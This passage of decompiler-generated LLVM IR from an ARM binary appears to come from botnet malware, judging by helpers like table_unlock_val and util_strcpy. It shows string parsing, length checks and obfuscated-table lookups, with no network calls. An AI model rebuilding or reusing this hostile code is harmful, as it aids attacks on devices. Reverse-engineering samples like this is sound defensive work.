  %v3_9bc0 = load i32, i32* %v2_9bc0, align 4
  %v1_9bc4 = and i32 %v3_9bc0, 33554432
  %v2_9bc4 = icmp ne i32 %v1_9bc4, 0
  store i1 %v2_9bc4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bc4 = mul i32 %v3_9bc0, 128
  %v1_9bc8 = add i32 %v3_9bc4, 1472
  %v0_9bcc = load i32, i32* %sb.global-to-local, align 4
  %v1_9bcc = load i32, i32* @r5, align 4
  %v2_9bd0 = add i32 %v1_9bc8, %v0_9bcc
  store i32 %v2_9bd0, i32* @r4, align 4
  %v2_9bcc = add i32 %v0_9bcc, %v4_9bbc
  %v2_9bd4 = add i32 %v2_9bcc, %v1_9bcc
  store i32 %v2_9bd4, i32* @r5, align 4
  %v0_9bd8 = load i32, i32* %fp.global-to-local, align 4
  %v1_9bd8 = trunc i32 %v0_9bd8 to i8
  %v3_9bd8 = add i32 %v2_9bd4, 2115
  %v4_9bd8 = inttoptr i32 %v3_9bd8 to i8*
  store i8 %v1_9bd8, i8* %v4_9bd8, align 1
  %v0_9bdc = load i32, i32* @r4, align 4
  store i32 %v0_9bdc, i32* %r0.global-to-local, align 4
  %v1_9be0 = inttoptr i32 %v0_9bdc to i8*
  %v2_9be0 = call i32 @util_strlen(i8* %v1_9be0)
  %v0_9be4 = load i32, i32* @r6, align 4
  store i32 %v0_9be4, i32* %r1.global-to-local, align 4
  %v0_9be8 = load i32, i32* @r4, align 4
  %v2_9be8 = add i32 %v0_9be8, %v2_9be0
  store i32 %v2_9be8, i32* @r0, align 4
  %v2_9bec = inttoptr i32 %v2_9be8 to i8*
  %v3_9bec = call i32 @util_strcpy(i8* %v2_9bec, i32 %v0_9be4)
  store i32 %v3_9bec, i32* %r0.global-to-local, align 4
  %v0_9bf0 = load i32, i32* @sl, align 4
  %v1_9bf0 = add i32 %v0_9bf0, 16
  %v2_9bf0 = inttoptr i32 %v1_9bf0 to i32*
  %v3_9bf0 = load i32, i32* %v2_9bf0, align 4
  %v1_9bf4 = add i32 %v3_9bf0, 1
  store i32 %v1_9bf4, i32* %r3.global-to-local, align 4
  store i32 %v1_9bf4, i32* %v2_9bf0, align 4
  br label %dec_label_pc_99ec

dec_label_pc_9c00:                                ; preds = %dec_label_pc_9644
  %v0_9c00 = load i32, i32* %sb.global-to-local, align 4
  %v1_9c04 = add i32 %v0_9c00, 533
  store i32 %v1_9c04, i32* @r4, align 4
  store i32 %v1_9c04, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9c10 = call i32 @util_zero(i32 %v1_9c04, i32 255)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9c18 = load i32, i32* %stack_var_-44, align 4
  %v0_9c1c = load i32, i32* @r6, align 4
  %v1_9c1c = add i32 %v0_9c1c, 1
  store i32 %v1_9c1c, i32* @r6, align 4
  %v2_9c20 = add i32 %v1_9c1c, %v3_9c18
  store i32 %v2_9c20, i32* %r0.global-to-local, align 4
  %v1_9c24 = inttoptr i32 %v2_9c20 to i8*
  %v2_9c24 = call i32 @util_strlen(i8* %v1_9c24)
  store i32 %v2_9c24, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9c28 = icmp eq i32 %v2_9c24, 0
  store i1 %v2_9c28, i1* %cpsr_z.global-to-local, align 1
  %tmp212 = icmp slt i32 %v2_9c24, 1
  br i1 %tmp212, label %dec_label_pc_9654, label %dec_label_pc_9c30

dec_label_pc_9c30:                                ; preds = %dec_label_pc_9c00
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9c34 = load i32, i32* %stack_var_-44, align 4
  %v0_9c38 = load i32, i32* @r6, align 4
  %v2_9c38 = add i32 %v0_9c38, %v3_9c34
  store i32 %v2_9c38, i32* %r0.global-to-local, align 4
  %v1_9c3c = inttoptr i32 %v2_9c38 to i8*
  %v2_9c3c = call i32 @util_strlen(i8* %v1_9c3c)
  store i32 %v2_9c3c, i32* %r0.global-to-local, align 4
  %v2_9c40 = icmp ugt i32 %v2_9c3c, 254
  store i1 %v2_9c40, i1* %cpsr_c.global-to-local, align 1
  %v7_9c40 = icmp eq i32 %v2_9c3c, 255
  store i1 %v7_9c40, i1* %cpsr_z.global-to-local, align 1
  %v8_9c44 = icmp sgt i32 %v2_9c3c, 255
  br i1 %v8_9c44, label %dec_label_pc_9654, label %dec_label_pc_9c48

dec_label_pc_9c48:                                ; preds = %dec_label_pc_9c30
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v3_9c4c = load i32, i32* %stack_var_-44, align 4
  %v0_9c50 = load i32, i32* @r4, align 4
  store i32 %v0_9c50, i32* @r0, align 4
  %v0_9c54 = load i32, i32* @r6, align 4
  %v2_9c54 = add i32 %v0_9c54, %v3_9c4c
  store i32 %v2_9c54, i32* %r1.global-to-local, align 4
  %v2_9c58 = inttoptr i32 %v0_9c50 to i8*
  %v3_9c58 = call i32 @util_strcpy(i8* %v2_9c58, i32 %v2_9c54)
  store i32 %v3_9c58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9654

dec_label_pc_9c60:                                ; preds = %dec_label_pc_98e0
  store i32 7, i32* @ip, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9c6c = load i32, i32* @r6, align 4
  %v1_9c6c = add i32 %v0_9c6c, 4
  %v2_9c6c = inttoptr i32 %v1_9c6c to i8*
  %v3_9c6c = load i8, i8* %v2_9c6c, align 1
  %v4_9c6c = zext i8 %v3_9c6c to i32
  store i32 %v4_9c6c, i32* @r3, align 4
  %v2_9c70 = icmp ugt i8 %v3_9c6c, 114
  store i1 %v2_9c70, i1* %cpsr_c.global-to-local, align 1
  %v7_9c70 = icmp eq i8 %v3_9c6c, 115
  store i1 %v7_9c70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c70, label %bb213, label %.thread47

bb213:                                            ; preds = %dec_label_pc_9c60
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_9c60, %bb213
  %v3_9c80 = phi i32 [ 7, %dec_label_pc_9c60 ], [ 8, %bb213 ]
  %v1_9c84 = sub nsw i32 1, %v3_9c80
  %v1_9c88 = load i32, i32* @r7, align 4
  %v2_9c88 = add i32 %v1_9c88, %v1_9c84
  store i32 %v2_9c88, i32* @r2, align 4
  %v2_9c8c = add i32 %v3_9c80, %v0_9c6c
  store i32 %v2_9c8c, i32* @r1, align 4
  store i32 %v0_9c6c, i32* @r0, align 4
  %v3_9c94 = call i32 @memmove(i32 %v0_9c6c, i32 %v2_9c8c, i32 %v2_9c88)
  store i32 %v3_9c94, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v0_9ca4 = load i32, i32* @r5, align 4
  %v1_9ca4 = load i32, i32* @r4, align 4
  %v2_9ca4 = add i32 %v1_9ca4, %v0_9ca4
  %v3_9ca4 = inttoptr i32 %v2_9ca4 to i8*
  %v4_9ca4 = load i8, i8* %v3_9ca4, align 1
  %v6_9ca4 = zext i8 %v4_9ca4 to i32
  store i32 %v6_9ca4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_9ca8 = icmp eq i8 %v4_9ca4, 0
  store i1 %v9_9ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9ca8, label %dec_label_pc_9ce8, label %dec_label_pc_9cb0

dec_label_pc_9cb0:                                ; preds = %.thread47
  %v2_9cb0 = icmp ugt i8 %v4_9ca4, 46
  store i1 %v2_9cb0, i1* %cpsr_c.global-to-local, align 1
  %v7_9cb0 = icmp eq i8 %v4_9ca4, 47
  store i1 %v7_9cb0, i1* %cpsr_z.global-to-local, align 1
  %v1_9cb4 = load i32, i32* @r6, align 4
  br i1 %v7_9cb0, label %bb214, label %dec_label_pc_9cbc

bb214:                                            ; preds = %dec_label_pc_9cb0
  store i32 %v1_9cb4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9d68

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9cb0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9ccc

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9ccc
  %v2_9cc4 = icmp ugt i8 %v4_9cd8, 46
  store i1 %v2_9cc4, i1* %cpsr_c.global-to-local, align 1
  %v7_9cc4 = icmp eq i8 %v4_9cd8, 47
  store i1 %v7_9cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9cc4, label %dec_label_pc_9d68, label %dec_label_pc_9ccc

dec_label_pc_9ccc:                                ; preds = %dec_label_pc_9cc4, %dec_label_pc_9cbc
  %v0_9ccc = phi i32 [ %v1_9ccc, %dec_label_pc_9cc4 ], [ 0, %dec_label_pc_9cbc ]
  %v1_9ccc = add i32 %v0_9ccc, 1
  store i32 %v1_9ccc, i32* %r1.global-to-local, align 4
  store i32 %v10_82f0, i32* @ip, align 4
  store i32 %v1_9ccc, i32* %stack_var_-44, align 4
  %v2_9cd8 = add i32 %v1_9ccc, %v1_9cb4
  %v3_9cd8 = inttoptr i32 %v2_9cd8 to i8*
  %v4_9cd8 = load i8, i8* %v3_9cd8, align 1
  %v6_9cd8 = zext i8 %v4_9cd8 to i32
  store i32 %v6_9cd8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cdc = icmp eq i8 %v4_9cd8, 0
  store i1 %v2_9cdc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9cd8, i32* %r2.global-to-local, align 4
  br i1 %v2_9cdc, label %dec_label_pc_9ce8, label %dec_label_pc_9cc4

dec_label_pc_9ce8:                                ; preds = %dec_label_pc_9ccc, %.thread47, %dec_label_pc_9d68
  %v0_9ce8 = load i32, i32* @r6, align 4
  store i32 %v0_9ce8, i32* %r0.global-to-local, align 4
  %v1_9cec = inttoptr i32 %v0_9ce8 to i8*
  %v2_9cec = call i32 @util_strlen(i8* %v1_9cec)
  store i32 %v2_9cec, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cf0 = icmp eq i32 %v2_9cec, 0
  store i1 %v2_9cf0, i1* %cpsr_z.global-to-local, align 1
  %tmp215 = icmp slt i32 %v2_9cec, 1
  br i1 %tmp215, label %dec_label_pc_9d08, label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9ce8
  %v0_9cf8 = load i32, i32* @r6, align 4
  store i32 %v0_9cf8, i32* %r0.global-to-local, align 4
  %v1_9cfc = inttoptr i32 %v0_9cf8 to i8*
  %v2_9cfc = call i32 @util_strlen(i8* %v1_9cfc)
  store i32 %v2_9cfc, i32* %r0.global-to-local, align 4
  %v2_9d00 = icmp ugt i32 %v2_9cfc, 126
  store i1 %v2_9d00, i1* %cpsr_c.global-to-local, align 1
  %v7_9d00 = icmp eq i32 %v2_9cfc, 127
  store i1 %v7_9d00, i1* %cpsr_z.global-to-local, align 1
  %v7_9d04 = icmp slt i32 %v2_9cfc, 128
  br i1 %v7_9d04, label %dec_label_pc_9ec8, label %dec_label_pc_9d08

dec_label_pc_9d08:                                ; preds = %dec_label_pc_9cf8, %dec_label_pc_9ce8, %dec_label_pc_9ec8
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9d0c = load i32, i32* %stack_var_-44, align 4
  %v0_9d10 = load i32, i32* @r6, align 4
  %v1_9d10 = add i32 %v0_9d10, 1
  store i32 %v1_9d10, i32* @r5, align 4
  %v2_9d14 = add i32 %v1_9d10, %v3_9d0c
  store i32 %v2_9d14, i32* %r0.global-to-local, align 4
  %v1_9d18 = inttoptr i32 %v2_9d14 to i8*
  %v2_9d18 = call i32 @util_strlen(i8* %v1_9d18)
  store i32 %v2_9d18, i32* %r0.global-to-local, align 4
  %v2_9d1c = icmp ugt i32 %v2_9d18, 254
  store i1 %v2_9d1c, i1* %cpsr_c.global-to-local, align 1
  %v7_9d1c = icmp eq i32 %v2_9d18, 255
  store i1 %v7_9d1c, i1* %cpsr_z.global-to-local, align 1
  %v8_9d20 = icmp sgt i32 %v2_9d18, 255
  br i1 %v8_9d20, label %dec_label_pc_9918, label %dec_label_pc_9d24

dec_label_pc_9d24:                                ; preds = %dec_label_pc_9d08
  %v0_9d24 = load i32, i32* %sb.global-to-local, align 4
  %v1_9d28 = add i32 %v0_9d24, 533
  store i32 %v1_9d28, i32* @r4, align 4
  store i32 %v1_9d28, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9d34 = call i32 @util_zero(i32 %v1_9d28, i32 255)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9d3c = load i32, i32* %stack_var_-44, align 4
  %v0_9d40 = load i32, i32* @r5, align 4
  %v2_9d40 = add i32 %v0_9d40, %v3_9d3c
  store i32 %v2_9d40, i32* %r0.global-to-local, align 4
  %v1_9d44 = inttoptr i32 %v2_9d40 to i8*
  %v2_9d44 = call i32 @util_strlen(i8* %v1_9d44)
  store i32 %v2_9d44, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9d48 = icmp eq i32 %v2_9d44, 0
  store i1 %v2_9d48, i1* %cpsr_z.global-to-local, align 1
  %tmp216 = icmp slt i32 %v2_9d44, 1
  br i1 %tmp216, label %dec_label_pc_9918, label %dec_label_pc_9d50

dec_label_pc_9d50:                                ; preds = %dec_label_pc_9d24
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9d54 = load i32, i32* %stack_var_-44, align 4
  %v0_9d58 = load i32, i32* @r4, align 4
  store i32 %v0_9d58, i32* @r0, align 4
  %v0_9d5c = load i32, i32* @r5, align 4
  %v2_9d5c = add i32 %v0_9d5c, %v3_9d54
  store i32 %v2_9d5c, i32* %r1.global-to-local, align 4
  %v2_9d60 = inttoptr i32 %v0_9d58 to i8*
  %v3_9d60 = call i32 @util_strcpy(i8* %v2_9d60, i32 %v2_9d5c)
  store i32 %v3_9d60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9918

dec_label_pc_9d68:                                ; preds = %dec_label_pc_9cc4, %bb214
  %v2_9d6c = phi i32 [ %v1_9cb4, %bb214 ], [ %v2_9cd8, %dec_label_pc_9cc4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9d6c = inttoptr i32 %v2_9d6c to i8*
  store i8 0, i8* %v3_9d6c, align 1
  br label %dec_label_pc_9ce8

dec_label_pc_9d74:                                ; preds = %dec_label_pc_9898
  %v1_9d74 = add i32 %v0_9d74, 1
  store i32 %v1_9d74, i32* %ip.global-to-local, align 4
  %v2_9d78 = add i32 %v0_9898, %v1_9d74
  store i32 %v2_9d78, i32* %r4.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v2_9d78, i32* %r0.global-to-local, align 4
  store i32 %v1_9d74, i32* %stack_var_-44, align 4
  %v1_9d88 = inttoptr i32 %v2_9d78 to i8*
  %v2_9d88 = call i32 @util_strlen(i8* %v1_9d88)
  store i32 %v2_9d88, i32* %r0.global-to-local, align 4
  %v0_9d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d8c = add i32 %v0_9d8c, %v2_9d88
  %v1_9d90 = add i32 %v2_9d8c, -1
  %v2_9d90 = inttoptr i32 %v1_9d90 to i8*
  %v3_9d90 = load i8, i8* %v2_9d90, align 1
  %v4_9d90 = zext i8 %v3_9d90 to i32
  store i32 %v4_9d90, i32* %r3.global-to-local, align 4
  %v2_9d94 = icmp ugt i8 %v3_9d90, 33
  store i1 %v2_9d94, i1* %cpsr_c.global-to-local, align 1
  %v7_9d94 = icmp eq i8 %v3_9d90, 34
  store i1 %v7_9d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d94, label %dec_label_pc_9d9c, label %dec_label_pc_98a4

dec_label_pc_9d9c:                                ; preds = %dec_label_pc_9d74
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9da0 = load i32, i32* %stack_var_-44, align 4
  %v0_9da4 = load i32, i32* @r5, align 4
  %v2_9da4 = add i32 %v0_9da4, %v3_9da0
  store i32 %v2_9da4, i32* %r4.global-to-local, align 4
  store i32 %v2_9da4, i32* %r0.global-to-local, align 4
  %v1_9dac = inttoptr i32 %v2_9da4 to i8*
  %v2_9dac = call i32 @util_strlen(i8* %v1_9dac)
  store i32 %v2_9dac, i32* %r0.global-to-local, align 4
  %v2_9db0 = add i32 %v2_9da4, %v2_9dac
  %v0_9db4 = load i32, i32* @r6, align 4
  %v1_9db4 = trunc i32 %v0_9db4 to i8
  %v3_9db4 = add i32 %v2_9db0, -1
  %v4_9db4 = inttoptr i32 %v3_9db4 to i8*
  store i8 %v1_9db4, i8* %v4_9db4, align 1
  br label %dec_label_pc_98a4

dec_label_pc_9dbc:                                ; preds = %dec_label_pc_990c
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9dc0 = load i32, i32* %stack_var_-44, align 4
  %v0_9dc4 = load i32, i32* @r6, align 4
  %v1_9dc4 = add i32 %v0_9dc4, 1
  store i32 %v1_9dc4, i32* @r5, align 4
  %v2_9dc8 = add i32 %v1_9dc4, %v3_9dc0
  store i32 %v2_9dc8, i32* %r0.global-to-local, align 4
  %v1_9dcc = inttoptr i32 %v2_9dc8 to i8*
  %v2_9dcc = call i32 @util_strlen(i8* %v1_9dcc)
  store i32 %v2_9dcc, i32* %r0.global-to-local, align 4
  %v2_9dd0 = icmp ugt i32 %v2_9dcc, 254
  store i1 %v2_9dd0, i1* %cpsr_c.global-to-local, align 1
  %v7_9dd0 = icmp eq i32 %v2_9dcc, 255
  store i1 %v7_9dd0, i1* %cpsr_z.global-to-local, align 1
  %v8_9dd4 = icmp sgt i32 %v2_9dcc, 255
  br i1 %v8_9dd4, label %dec_label_pc_9918, label %dec_label_pc_9dd8

dec_label_pc_9dd8:                                ; preds = %dec_label_pc_9dbc
  %v0_9dd8 = load i32, i32* %sb.global-to-local, align 4
  %v1_9ddc = add i32 %v0_9dd8, 533
  store i32 %v1_9ddc, i32* @r4, align 4
  store i32 %v1_9ddc, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9de8 = call i32 @util_zero(i32 %v1_9ddc, i32 255)
  store i32 %v10_82f0, i32* @ip, align 4
  %v3_9df0 = load i32, i32* %stack_var_-44, align 4
  %v0_9df4 = load i32, i32* @r5, align 4
  %v2_9df4 = add i32 %v0_9df4, %v3_9df0
  store i32 %v2_9df4, i32* %r0.global-to-local, align 4
  %v1_9df8 = inttoptr i32 %v2_9df4 to i8*
  %v2_9df8 = call i32 @util_strlen(i8* %v1_9df8)
  store i32 %v2_9df8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9dfc = icmp eq i32 %v2_9df8, 0
  store i1 %v2_9dfc, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v2_9df8, 1
  br i1 %tmp217, label %dec_label_pc_9918, label %dec_label_pc_9e04

dec_label_pc_9e04:                                ; preds = %dec_label_pc_9dd8
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9e08 = load i32, i32* %stack_var_-44, align 4
  %v0_9e0c = load i32, i32* @r4, align 4
  store i32 %v0_9e0c, i32* @r0, align 4
  %v0_9e10 = load i32, i32* @r5, align 4
  %v2_9e10 = add i32 %v0_9e10, %v3_9e08
  store i32 %v2_9e10, i32* %r1.global-to-local, align 4
  %v2_9e14 = inttoptr i32 %v0_9e0c to i8*
  %v3_9e14 = call i32 @util_strcpy(i8* %v2_9e14, i32 %v2_9e10)
  store i32 %v3_9e14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9918

dec_label_pc_9e1c:                                ; preds = %dec_label_pc_84c0
  store i32 57, i32* %r0.global-to-local, align 4
  %v1_9e20 = call i32 @table_unlock_val(i32 57)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 57, i32* %r0.global-to-local, align 4
  %v3_9e2c = call i32 @table_retrieve_val(i32 57, i32* null)
  store i32 %v3_9e2c, i32* %r1.global-to-local, align 4
  %v0_9e34 = load i32, i32* @r5, align 4
  %v1_9e34 = add i32 %v0_9e34, 20
  store i32 %v1_9e34, i32* @r0, align 4
  %v2_9e38 = inttoptr i32 %v1_9e34 to i8*
  %v3_9e38 = call i32 @util_strcpy(i8* %v2_9e38, i32 %v3_9e2c)
  store i32 57, i32* %r0.global-to-local, align 4
  %v1_9e40 = call i32 @table_lock_val(i32 57)
  store i32 %v1_9e40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9e44:                                ; preds = %dec_label_pc_84c0, %dec_label_pc_9f34, %dec_label_pc_9f08, %dec_label_pc_9edc, %dec_label_pc_9e9c, %dec_label_pc_9e1c
  store i32 %v0_840c, i32* @r0, align 4
  %v0_9e48 = load i32, i32* @r8, align 4
  store i32 %v0_9e48, i32* %r1.global-to-local, align 4
  %v2_9e4c = inttoptr i32 %v0_840c to i8*
  %v3_9e4c = call i32 @util_strcpy(i8* %v2_9e4c, i32 %v0_9e48)
  store i32 %v3_9e4c, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_9e54 = load i32, i32* %fp.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 1
  store i32 %v1_9e54, i32* %fp.global-to-local, align 4
  %v0_9e58 = load i32, i32* @r5, align 4
  %v3_9e5c = icmp uge i32 %v1_9e54, %v0_839c
  store i1 %v3_9e5c, i1* %cpsr_c.global-to-local, align 1
  %v9_9e5c = icmp eq i32 %v1_9e54, %v0_839c
  store i1 %v9_9e5c, i1* %cpsr_z.global-to-local, align 1
  %v1_9e60 = add i32 %v0_9e58, 3140
  store i32 %v1_9e60, i32* @r5, align 4
  br i1 %v9_9e5c, label %dec_label_pc_9e68, label %dec_label_pc_83cc

dec_label_pc_9e68:                                ; preds = %dec_label_pc_9e44
  %v0_9e78 = load i32, i32* @r7, align 4
  %v1_9e78 = and i32 %v0_9e78, 128
  %v2_9e78 = icmp ne i32 %v1_9e78, 0
  store i1 %v2_9e78, i1* %cpsr_c.global-to-local, align 1
  %v3_9e78 = udiv i32 %v0_9e78, 256
  %v1_9e7c = add i32 %v2_83b0, 1452
  store i32 %v1_9e7c, i32* %r3.global-to-local, align 4
  %v2_9e80 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_9e80, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_852c.preheader

dec_label_pc_9e9c:                                ; preds = %dec_label_pc_84c0
  store i32 58, i32* %r0.global-to-local, align 4
  %v1_9ea0 = call i32 @table_unlock_val(i32 58)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 58, i32* %r0.global-to-local, align 4
  %v3_9eac = call i32 @table_retrieve_val(i32 58, i32* null)
  store i32 %v3_9eac, i32* %r1.global-to-local, align 4
  %v0_9eb4 = load i32, i32* @r5, align 4
  %v1_9eb4 = add i32 %v0_9eb4, 20
  store i32 %v1_9eb4, i32* @r0, align 4
  %v2_9eb8 = inttoptr i32 %v1_9eb4 to i8*
  %v3_9eb8 = call i32 @util_strcpy(i8* %v2_9eb8, i32 %v3_9eac)
  store i32 58, i32* %r0.global-to-local, align 4
  %v1_9ec0 = call i32 @table_lock_val(i32 58)
  store i32 %v1_9ec0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9ec8:                                ; preds = %dec_label_pc_9cf8
  %v0_9ec8 = load i32, i32* %sb.global-to-local, align 4
  %v0_9ecc = load i32, i32* @r6, align 4
  store i32 %v0_9ecc, i32* %r1.global-to-local, align 4
  %v1_9ed0 = add i32 %v0_9ec8, 789
  store i32 %v1_9ed0, i32* @r0, align 4
  %v2_9ed4 = inttoptr i32 %v1_9ed0 to i8*
  %v3_9ed4 = call i32 @util_strcpy(i8* %v2_9ed4, i32 %v0_9ecc)
  store i32 %v3_9ed4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9d08

dec_label_pc_9edc:                                ; preds = %dec_label_pc_84c0
  store i32 55, i32* %r0.global-to-local, align 4
  %v1_9ee0 = call i32 @table_unlock_val(i32 55)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 55, i32* %r0.global-to-local, align 4
  %v3_9eec = call i32 @table_retrieve_val(i32 55, i32* null)
  store i32 %v3_9eec, i32* %r1.global-to-local, align 4
  %v0_9ef4 = load i32, i32* @r5, align 4
  %v1_9ef4 = add i32 %v0_9ef4, 20
  store i32 %v1_9ef4, i32* @r0, align 4
  %v2_9ef8 = inttoptr i32 %v1_9ef4 to i8*
  %v3_9ef8 = call i32 @util_strcpy(i8* %v2_9ef8, i32 %v3_9eec)
  store i32 55, i32* %r0.global-to-local, align 4
  %v1_9f00 = call i32 @table_lock_val(i32 55)
  store i32 %v1_9f00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9f08:                                ; preds = %dec_label_pc_84c0
  store i32 54, i32* %r0.global-to-local, align 4
  %v1_9f0c = call i32 @table_unlock_val(i32 54)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 54, i32* %r0.global-to-local, align 4
  %v3_9f18 = call i32 @table_retrieve_val(i32 54, i32* null)
  store i32 %v3_9f18, i32* %r1.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r5, align 4
  %v1_9f20 = add i32 %v0_9f20, 20
  store i32 %v1_9f20, i32* @r0, align 4
  %v2_9f24 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f24 = call i32 @util_strcpy(i8* %v2_9f24, i32 %v3_9f18)
  store i32 54, i32* %r0.global-to-local, align 4
  %v1_9f2c = call i32 @table_lock_val(i32 54)
  store i32 %v1_9f2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9f34:                                ; preds = %dec_label_pc_84c0
  store i32 56, i32* %r0.global-to-local, align 4
  %v1_9f38 = call i32 @table_unlock_val(i32 56)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r0.global-to-local, align 4
  %v3_9f44 = call i32 @table_retrieve_val(i32 56, i32* null)
  store i32 %v3_9f44, i32* %r1.global-to-local, align 4
  %v0_9f4c = load i32, i32* @r5, align 4
  %v1_9f4c = add i32 %v0_9f4c, 20
  store i32 %v1_9f4c, i32* @r0, align 4
  %v2_9f50 = inttoptr i32 %v1_9f4c to i8*
  %v3_9f50 = call i32 @util_strcpy(i8* %v2_9f50, i32 %v3_9f44)
  store i32 56, i32* %r0.global-to-local, align 4
  %v1_9f58 = call i32 @table_lock_val(i32 56)
  store i32 %v1_9f58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

; uselistorder directives
  uselistorder i32 %v2_9e80, { 1, 0 }
  uselistorder i32 %v1_9e7c, { 1, 0 }
  uselistorder i32 %v0_9e78, { 0, 2, 1 }
  uselistorder i32 %v1_9e60, { 1, 0 }
  uselistorder i32 %v1_9d74, { 1, 0, 2 }
  uselistorder i8 %v4_9cd8, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9ccc, { 0, 2, 3, 1 }
  uselistorder i1 %v7_9cc4, { 1, 0 }
  uselistorder i32 %v1_9cb4, { 1, 0, 2 }
  uselistorder i1 %v7_9cb0, { 1, 0 }
  uselistorder i1 %v9_9ca8, { 1, 0 }
  uselistorder i32 %v0_9c6c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9bcc, { 1, 0 }
  uselistorder i32 %v2_9ba8, { 1, 0, 2 }
  uselistorder i32 %v1_9ba0, { 1, 0, 2 }
  uselistorder i32 %v1_9b28, { 0, 2, 1 }
  uselistorder i32 %v0_9b28, { 0, 2, 1 }
  uselistorder i32 %v2_9a9c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i8 %v4_9a74, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9a68, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9a60, { 1, 0 }
  uselistorder i32 %v1_9a50, { 1, 0, 2 }
  uselistorder i1 %v7_9a4c, { 1, 0 }
  uselistorder i32 %v0_9a0c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_99d0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_99b4, { 1, 0, 2 }
  uselistorder i32 %v4_99ac, { 2, 1, 0, 3 }
  uselistorder i32 %v0_98d4, { 1, 0 }
  uselistorder i32 %v0_9898, { 1, 0 }
  uselistorder i32 %v0_9d74, { 1, 0 }
  uselistorder i1 %v7_9854, { 1, 0 }
  uselistorder i32 %v0_983c, { 1, 0 }
  uselistorder i32 %v2_982c, { 1, 0, 2 }
  uselistorder i32 %v1_97f8, { 1, 0 }
  uselistorder i32 %v0_97f8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_9790, { 1, 0 }
  uselistorder i32 %v5_978c, { 1, 2, 6, 4, 5, 3, 0, 7, 8 }
  uselistorder i32 %v2_9774.v4_975c, { 1, 0, 2 }
  uselistorder i1 %v7_9738, { 1, 0 }
  uselistorder i32 %v1_9618, { 1, 0, 2 }
  uselistorder i32 %v1_9610, { 1, 0 }
  uselistorder i1 %v7_95f8, { 1, 0 }
  uselistorder i32 %v5_95f4, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_95dc.v4_95c4, { 1, 0, 2 }
  uselistorder i1 %v7_95a4, { 1, 0 }
  uselistorder i32 %v0_950c, { 1, 0 }
  uselistorder i32 %v0_94f4, { 1, 0 }
